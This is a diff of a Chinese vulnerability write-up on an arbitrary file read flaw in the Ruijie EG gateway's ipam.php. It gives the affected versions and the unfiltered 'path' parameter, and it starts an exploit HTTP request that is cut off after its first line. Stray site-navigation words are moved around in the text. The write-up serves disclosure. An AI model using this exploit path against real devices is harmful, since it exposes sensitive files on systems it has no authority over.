@@ -8,8 +8,6 @@ asset_dir: embedded-base64
 
 锐捷EG易网关是一款综合网关，由锐捷网络完全自主研发。它集成了先进的软硬件体系架构，配备了DPI深入分析引擎、行为分析/管理引擎，可以在保证网络出口高效转发的条件下，提供专业的流控功能、出色的URL过滤以及本地化的日志存储/审计服务。锐捷EG易网关 `ipam.php` 的 `getIpamJsonAction` 存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞，攻击者可以利用该[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)读取设备上任意文件内容，造成敏感信息泄露。
 
-漏洞利用分析
-
 # 影响版本
 
 <=2022.07.28.01
@@ -21,14 +19,6 @@ asset_dir: embedded-base64
 # 漏洞分析
 
 直接看 `ddi/server/ipam.php` 中的 `getIpamJsonAction` 方法实现
-
-深入探索
-
-编码转换工具
-
-威胁情报订阅
-
-Web安全课程
 
 ```
 public function getIpamJsonAction() {
@@ -42,6 +32,14 @@ public function getIpamJsonAction() {
 直接将无任何过滤和校验 post 获取的 `path` 直接带入 `file_get_contents` 函数中进行文件操作，导致任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。
 
 # 漏洞复现
+
+深入探索
+
+软件
+
+编程
+
+网络设备
 
 ```
 POST /ddi/server/ipam.php?a=getIpamJson HTTP/1.1
